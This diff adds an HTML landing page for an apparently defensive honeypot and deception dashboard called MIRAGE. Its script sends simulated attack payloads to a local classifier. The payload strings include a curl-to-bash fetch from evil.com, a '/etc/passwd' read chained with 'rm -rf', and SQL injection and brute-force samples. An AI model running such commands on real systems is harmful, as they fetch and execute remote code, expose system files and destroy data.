@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MIRAGE — Cyber Deception System</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    /* Specialized Landing Page Style rules */
+    .hero-layout {
+      display: grid;
+      grid-template-columns: 7fr 5fr;
+      gap: 24px;
+      align-items: stretch;
+    }
+    
+    @media (max-width: 1024px) {
+      .hero-layout { grid-template-columns: 1fr; }
+    }
+    
+    /* Decoy interactive visualizer */
+    .decoy-grid-view {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      margin-top: 16px;
+    }
+    
+    .decoy-card {
+      background: rgba(30, 41, 59, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 8px;
+      padding: 16px;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-height: 110px;
+    }
+    
+    .decoy-card:hover {
+      background: rgba(30, 41, 59, 0.75);
+      border-color: var(--accent-blue);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 15px rgba(6, 182, 212, 0.1);
+    }
+    
+    .decoy-card.active {
+      border-color: var(--accent-green);
+      background: rgba(0, 255, 136, 0.04);
+      box-shadow: 0 0 15px rgba(0, 255, 136, 0.1);
+    }
+    
+    .decoy-name {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      font-weight: bold;
+      color: var(--text-primary);
+    }
+    
+    .decoy-card.active .decoy-name {
+      color: var(--accent-green);
+      text-shadow: 0 0 8px rgba(0, 255, 136, 0.2);
+    }
+    
+    .decoy-status {
+      font-size: 9px;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      margin-top: 4px;
+      font-family: var(--font-mono);
+    }
+    
+    .decoy-card.active .decoy-status {
+      color: var(--accent-green);
+    }
+    
+    .decoy-icon {
+      font-size: 24px;
+      margin-top: 12px;
+      align-self: flex-end;
+    }
+    
+    /* Decoy Inspector Panel */
+    .inspector-panel {
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      height: 100%;
+    }
+    
+    .inspector-title {
+      font-family: var(--font-mono);
+      font-size: 16px;
+      color: var(--accent-blue);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 12px;
+      text-shadow: 0 0 8px rgba(6, 182, 212, 0.2);
+    }
+    
+    .inspector-description {
+      font-size: 12px;
+      color: var(--text-secondary);
+      line-height: 1.5;
+      margin-bottom: 18px;
+    }
+    
+    .inspector-meta {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      background: rgba(3, 5, 10, 0.4);
+      padding: 16px;
+      border-radius: 8px;
+      border: 1px solid var(--card-border);
+      font-family: var(--font-mono);
+      font-size: 11px;
+    }
+    
+    .inspector-meta-row {
+      display: flex;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+      padding-bottom: 6px;
+    }
+    
+    .inspector-meta-row:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+    
+    .inspector-meta-label {
+      color: var(--text-secondary);
+    }
+    
+    .inspector-meta-value {
+      color: var(--text-primary);
+      font-weight: bold;
+    }
+    
+    /* System Control console */
+    .control-console {
+      margin-top: 24px;
+    }
+    
+    .control-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 16px;
+    }
+    
+    @media (max-width: 768px) {
+      .control-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    
+    <!-- 1. HEADER -->
+    <header class="main-header">
+      <a href="index.html" class="logo-section">
+        <span class="logo-badge">🛡️</span>
+        <div class="logo-text">
+          <span class="logo-title">MIRAGE</span>
+          <span class="logo-subtitle">Adaptive Threat Deception</span>
+        </div>
+      </a>
+      
+      <nav>
+        <ul class="nav-links">
+          <li class="nav-item active"><a href="index.html">Portal</a></li>
+          <li class="nav-item"><a href="dashboard.html">SOC Cockpit</a></li>
+          <li class="nav-item"><a href="sessions.html">Attacker Profiles</a></li>
+          <li class="nav-item"><a href="intel.html">Threat Intel</a></li>
+        </ul>
+      </nav>
+      
+      <div class="nav-stats">
+        <div class="nav-stat-item">
+          <span class="nav-stat-label">System State</span>
+          <span class="nav-stat-value" id="headerThreatLevel" style="color: var(--accent-green);">MONITORING</span>
+        </div>
+        <div class="nav-stat-item">
+          <span class="nav-stat-label">Total Events</span>
+          <span class="nav-stat-value" id="headerTotalAttacks" style="color: var(--accent-blue);">0</span>
+        </div>
+        <div class="nav-stat-item">
+          <span class="nav-stat-label">Active Decoys</span>
+          <span class="nav-stat-value" id="headerActiveDecoys" style="color: var(--accent-purple);">0</span>
+        </div>
+        <span class="nav-status-indicator" id="headerThreatIndicator"></span>
+      </div>
+    </header>
+
+    <!-- 2. QUICK STATS ROW -->
+    <section class="grid-6col">
+      <div class="glass-card" style="padding: 16px; border-left: 3px solid var(--accent-blue);">
+        <div class="nav-stat-label">Total Attacks</div>
+        <div id="statTotalAttacks" class="stat-card-value text-blue" style="font-size: 24px; margin-top: 8px;">0</div>
+      </div>
+      <div class="glass-card" style="padding: 16px; border-left: 3px solid var(--accent-green);">
+        <div class="nav-stat-label">Unique Attackers</div>
+        <div id="statUniqueIPs" class="stat-card-value text-green" style="font-size: 24px; margin-top: 8px;">0</div>
+      </div>
+      <div class="glass-card" style="padding: 16px; border-left: 3px solid var(--accent-purple);">
+        <div class="nav-stat-label">Active Sessions</div>
+        <div id="statActiveSessions" class="stat-card-value text-purple" style="font-size: 24px; margin-top: 8px;">0</div>
+      </div>
+      <div class="glass-card" style="padding: 16px; border-left: 3px solid var(--accent-yellow);">
+        <div class="nav-stat-label">FP Rate</div>
+        <div id="statFPRate" class="stat-card-value text-yellow" style="font-size: 24px; margin-top: 8px;">0%</div>
+      </div>
+      <div class="glass-card" style="padding: 16px; border-left: 3px solid var(--accent-orange);">
+        <div class="nav-stat-label">Deception Eff</div>
+        <div id="statAdaptationEff" class="stat-card-value text-orange" style="font-size: 24px; margin-top: 8px;">0%</div>
+      </div>
+      <div class="glass-card" style="padding: 16px; border-left: 3px solid var(--accent-red);">
+        <div class="nav-stat-label">Avg Response</div>
+        <div id="statLatency" class="stat-card-value text-red" style="font-size: 24px; margin-top: 8px;">0ms</div>
+      </div>
+    </section>
+
+    <!-- 3. HERO DECOY VISUALIZATION & CONTROL -->
+    <main class="hero-layout">
+      
+      <!-- Interactive Decoy Matrix Card -->
+      <section class="glass-card">
+        <h2>🌐 Adaptive Decoy Systems matrix</h2>
+        <p style="font-size: 12px; color: var(--text-secondary); margin-bottom: 16px;">
+          MIRAGE dynamically activates targeted environments based on classification confidence and attacker history. Click a node below to inspect its behavior profile.
+        </p>
+        
+        <div class="decoy-grid-view">
+          <div class="decoy-card active" onclick="inspectDecoy('database_decoy', this)">
+            <div>
+              <div class="decoy-name">Database Decoy</div>
+              <div class="decoy-status">Active Decoy</div>
+            </div>
+            <div class="decoy-icon">🗄️</div>
+          </div>
+          <div class="decoy-card" onclick="inspectDecoy('credential_trap', this)">
+            <div>
+              <div class="decoy-name">Credential Trap</div>
+              <div class="decoy-status">Monitoring</div>
+            </div>
+            <div class="decoy-icon">🔑</div>
+          </div>
+          <div class="decoy-card" onclick="inspectDecoy('shell_trap', this)">
+            <div>
+              <div class="decoy-name">Shell Trap</div>
+              <div class="decoy-status">Monitoring</div>
+            </div>
+            <div class="decoy-icon">🐚</div>
+          </div>
+          <div class="decoy-card" onclick="inspectDecoy('malware_sink', this)">
+            <div>
+              <div class="decoy-name">Malware Sink</div>
+              <div class="decoy-status">Monitoring</div>
+            </div>
+            <div class="decoy-icon">🦠</div>
+          </div>
+          <div class="decoy-card" onclick="inspectDecoy('filesystem_decoy', this)">
+            <div>
+              <div class="decoy-name">Filesystem Decoy</div>
+              <div class="decoy-status">Monitoring</div>
+            </div>
+            <div class="decoy-icon">📁</div>
+          </div>
+          <div class="decoy-card" onclick="inspectDecoy('web_decoy', this)">
+            <div>
+              <div class="decoy-name">Web Decoy</div>
+              <div class="decoy-status">Monitoring</div>
+            </div>
+            <div class="decoy-icon">🕸️</div>
+          </div>
+          <div class="decoy-card" onclick="inspectDecoy('port_expansion', this)">
+            <div>
+              <div class="decoy-name">Port Expansion</div>
+              <div class="decoy-status">Monitoring</div>
+            </div>
+            <div class="decoy-icon">🔌</div>
+          </div>
+          <div class="decoy-card" onclick="inspectDecoy('default', this)">
+            <div>
+              <div class="decoy-name">Default / Base</div>
+              <div class="decoy-status">Monitoring</div>
+            </div>
+            <div class="decoy-icon">🛡️</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Decoy Inspector details -->
+      <section class="glass-card">
+        <h2>🔍 Decoy Behavior Inspector</h2>
+        
+        <div class="inspector-panel">
+          <div>
+            <div class="inspector-title" id="inspName">Database Decoy</div>
+            <div class="inspector-description" id="inspDesc">
+              Mimics vulnerable database management servers (e.g., MySQL, PostgreSQL, Oracle). Exposes simulated table metadata, backup dumps, and supports blind SQL injection responses to lure attackers.
+            </div>
+            
+            <div class="inspector-meta">
+              <div class="inspector-meta-row">
+                <span class="inspector-meta-label">Default Ports</span>
+                <span class="inspector-meta-value" id="inspPorts">3306, 5432, 1521</span>
+              </div>
+              <div class="inspector-meta-row">
+                <span class="inspector-meta-label">Response Delay</span>
+                <span class="inspector-meta-value" id="inspDelay">150ms - 300ms</span>
+              </div>
+              <div class="inspector-meta-row">
+                <span class="inspector-meta-label">Lure Type</span>
+                <span class="inspector-meta-value" id="inspLures">SQL Dumps, Fake Config files, Mock Credential tables</span>
+              </div>
+              <div class="inspector-meta-row">
+                <span class="inspector-meta-label">Interaction Level</span>
+                <span class="inspector-meta-value" id="inspLevel">High (Full SQL Command emulation)</span>
+              </div>
+            </div>
+          </div>
+          
+          <div style="margin-top: 20px; border-top: 1px solid var(--card-border); padding-top: 16px;">
+            <a href="dashboard.html" class="btn btn-primary" style="width: 100%; justify-content: center;">
+              Launch SOC Cockpit
+            </a>
+          </div>
+        </div>
+      </section>
+      
+    </main>
+
+    <!-- 4. SIMULATION CONSOLE -->
+    <section class="glass-card control-console">
+      <h2>🛠️ Honeypot Simulation Control center</h2>
+      <p style="font-size: 12px; color: var(--text-secondary); margin-bottom: 16px;">
+        Use the controls below to ingest mock attack vectors into the system. These trigger the backend ML ensemble and update the dashboard in real time.
+      </p>
+      
+      <div class="control-grid">
+        <div style="display: flex; flex-direction: column; gap: 12px; background: rgba(3, 5, 10, 0.4); padding: 16px; border-radius: 8px; border: 1px solid var(--card-border);">
+          <div style="font-family: var(--font-mono); font-size: 11px; font-weight: bold; color: var(--accent-orange);">TRIGGER SINGLE ATTACKS</div>
+          <div style="display: flex; flex-wrap: wrap; gap: 8px;">
+            <button onclick="simulateAttack('port_scan')" class="btn">Port Scan</button>
+            <button onclick="simulateAttack('sql_injection')" class="btn">SQL Injection</button>
+            <button onclick="simulateAttack('brute_force')" class="btn">Brute Force</button>
+            <button onclick="simulateAttack('command_injection')" class="btn">RCE Exploit</button>
+          </div>
+        </div>
+        
+        <div style="display: flex; flex-direction: column; gap: 12px; background: rgba(3, 5, 10, 0.4); padding: 16px; border-radius: 8px; border: 1px solid var(--card-border);">
+          <div style="font-family: var(--font-mono); font-size: 11px; font-weight: bold; color: var(--accent-purple);">TRIGGER MULTI-STEP KILL CHAINS</div>
+          <div style="display: flex; flex-wrap: wrap; gap: 8px;">
+            <button onclick="simulateChain('recon_to_exploit')" class="btn">Recon → SQLi</button>
+            <button onclick="simulateChain('recon_to_rce')" class="btn">Recon → RCE</button>
+            <button onclick="simulateChain('full_kill_chain')" class="btn btn-primary">Full Kill Chain</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div>
+
+  <script src="js/api.js"></script>
+  <script>
+    // Decoy profiles database static specifications
+    const DECOY_SPECS = {
+      database_decoy: {
+        name: "Database Decoy",
+        desc: "Mimics vulnerable database management servers (e.g., MySQL, PostgreSQL, Oracle). Exposes simulated table structures, schemas, and supports mock SQL injection queries and delay payloads.",
+        ports: "3306, 5432, 1521",
+        delay: "150ms - 300ms",
+        lures: "SQL Dumps, Fake Config files, Mock Credential tables",
+        level: "High (Command Emulation)"
+      },
+      credential_trap: {
+        name: "Credential Trap",
+        desc: "Exposes mock login portals (SSH, HTTP Basic Auth, SMTP) designed to capture brute-force dictionary attempts. Accepts credentials after multiple attempts to record post-auth commands.",
+        ports: "22, 80, 443, 25",
+        delay: "400ms - 800ms",
+        lures: "Simulated Web Admin page, SSH shell prompts",
+        level: "Medium (Port listener)"
+      },
+      shell_trap: {
+        name: "Shell Trap",
+        desc: "Simulates command line shell prompts (bash, powershell, Telnet). Captures environment exploration CLI commands (whoami, ls -la, uname) and outputs simulated error alerts.",
+        ports: "23, 2222",
+        delay: "100ms - 200ms",
+        lures: "Vulnerable SSH configurations, Telnet portals",
+        level: "High (Shell Emulator)"
+      },
+      malware_sink: {
+        name: "Malware Sink",
+        desc: "Captures file uploads, scripts, and malicious executable uploads (Wget/Curl drops). Feeds files directly into a sandbox emulator, saving their SHA256 hashes.",
+        ports: "80, 443, 21",
+        delay: "50ms",
+        lures: "Writable uploads directory, FTP Server portal",
+        level: "High (Upload Emulator)"
+      },
+      filesystem_decoy: {
+        name: "Filesystem Decoy",
+        desc: "Mimics folder sharing networks (SMB, NFS, WebDAV) filled with simulated sensitive PDF reports, spreadsheets, and environment source code files containing fake API keys.",
+        ports: "445, 139, 2049",
+        delay: "200ms - 400ms",
+        lures: "Mock source files (.env, git configs), PDF reports",
+        level: "Medium (Mock filesystem)"
+      },
+      web_decoy: {
+        name: "Web Decoy",
+        desc: "Launches dynamic mock HTTP sites presenting standard vulnerabilities (XSS entrypoints, PHP admin tools, SSRF endpoints, Spring Boot configurations).",
+        ports: "8080, 8000, 80",
+        delay: "100ms - 250ms",
+        lures: "Apache/Nginx banners, mock login screens, .git endpoints",
+        level: "Medium (Static Web)"
+      },
+      port_expansion: {
+        name: "Port Expansion",
+        desc: "Dynamically opens dummy listeners on closed TCP/UDP ports when a port scanner (Nmap) is detected to inflate the network attack surface.",
+        ports: "Dynamic (1 - 65535)",
+        delay: "10ms",
+        lures: "Dynamic TCP/IP response patterns",
+        level: "Low (Surface Expansion)"
+      },
+      default: {
+        name: "Default (Base Monitoring)",
+        desc: "The standard telemetry listener mode. Does not deploy deceptive decoys, but passive network logging and machine learning classification remain 100% active.",
+        ports: "All standard ports",
+        delay: "0ms",
+        lures: "Standard OS network socket footprints",
+        level: "Low (Monitoring Only)"
+      }
+    };
+
+    function inspectDecoy(key, element) {
+      // Toggle active states
+      document.querySelectorAll(".decoy-card").forEach(c => c.classList.remove("active"));
+      element.classList.add("active");
+
+      // Load static specs
+      const spec = DECOY_SPECS[key];
+      if (spec) {
+        document.getElementById("inspName").textContent = spec.name;
+        document.getElementById("inspDesc").textContent = spec.desc;
+        document.getElementById("inspPorts").textContent = spec.ports;
+        document.getElementById("inspDelay").textContent = spec.delay;
+        document.getElementById("inspLures").textContent = spec.lures;
+        document.getElementById("inspLevel").textContent = spec.level;
+      }
+    }
+
+    // Ingests simulation attacks
+    async function simulateAttack(type) {
+      showToast(`Injecting simulated attack: ${type.toUpperCase()}`, "info");
+      
+      const payloadMap = {
+        port_scan: "NMAP SCAN / SYN scan",
+        sql_injection: "SELECT * FROM users WHERE id = '1' OR '1'='1' --",
+        brute_force: "login: root password: password123",
+        command_injection: "curl http://evil.com/malware.sh | bash"
+      };
+
+      const res = await safeFetch(`${API}/api/logs/ingest`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          ip_address: "192.168.1.55",
+          port: type === 'port_scan' ? 135 : 80,
+          protocol: "TCP",
+          payload: payloadMap[type] || "Generic probe payload",
+          metadata: {
+            user_agent: type === 'port_scan' ? "Nmap" : "Mozilla/5.0"
+          }
+        })
+      });
+
+      if (res && !res.error) {
+        showToast(`Attack Ingested! Classification: ${res.attack_type.replace('_', ' ').toUpperCase()} (Conf: ${(res.confidence * 100).toFixed(0)}%)`, "success");
+        // Update statistics
+        syncHeaderStats();
+        loadQuickStats();
+      }
+    }
+
+    // Ingests simulated multi-step kill chains sequentially
+    async function simulateChain(chainName) {
+      showToast(`Injecting sequential attack chain: ${chainName.replace(/_/g, ' ').toUpperCase()}`, "info");
+      
+      const stepsMap = {
+        recon_to_exploit: ["port_scan", "sql_injection"],
+        recon_to_rce: ["port_scan", "command_injection"],
+        full_kill_chain: ["port_scan", "brute_force", "command_injection", "malware_delivery"]
+      };
+
+      const payloadMap = {
+        port_scan: "Nmap port scanning request",
+        brute_force: "login admin password admin",
+        sql_injection: "SELECT * FROM accounts WHERE user='admin' --",
+        command_injection: "cat /etc/passwd; rm -rf /tmp",
+        malware_delivery: "downloading binary agent.elf"
+      };
+
+      const ip = `10.0.0.${Math.floor(Math.random() * 200) + 10}`;
+      const steps = stepsMap[chainName] || [];
+
+      for (let i = 0; i < steps.length; i++) {
+        const type = steps[i];
+        await safeFetch(`${API}/api/logs/ingest`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip_address: ip,
+            port: type === 'port_scan' ? 22 : 80,
+            protocol: "HTTP",
+            payload: payloadMap[type] || "Chain test",
+            metadata: { user_agent: "AttackSimulator/2.0" }
+          })
+        });
+        // Tiny sleep between steps to simulate delta timing
+        await new Promise(r => setTimeout(r, 800));
+      }
+
+      showToast(`Chain Ingest complete!`, "success");
+      syncHeaderStats();
+      loadQuickStats();
+    }
+
+    // Refresh quick stats summaries
+    async function loadQuickStats() {
+      const metrics = await safeFetch(`${API}/api/research/metrics`);
+      if (metrics.error) return;
+
+      document.getElementById("statTotalAttacks").textContent = metrics.total_attacks || 0;
+      document.getElementById("statUniqueIPs").textContent = metrics.total_unique_ips || 0;
+      document.getElementById("statActiveSessions").textContent = metrics.total_sessions || 0;
+      document.getElementById("statFPRate").textContent = (metrics.false_positive_rate_pct || 0) + "%";
+      document.getElementById("statAdaptationEff").textContent = (metrics.adaptation_effectiveness_pct || 0) + "%";
+      document.getElementById("statLatency").textContent = (metrics.average_response_time_ms || 0) + "ms";
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      loadQuickStats();
+      setInterval(loadQuickStats, 10000);
+    });
+  </script>
+</body>
+</html>
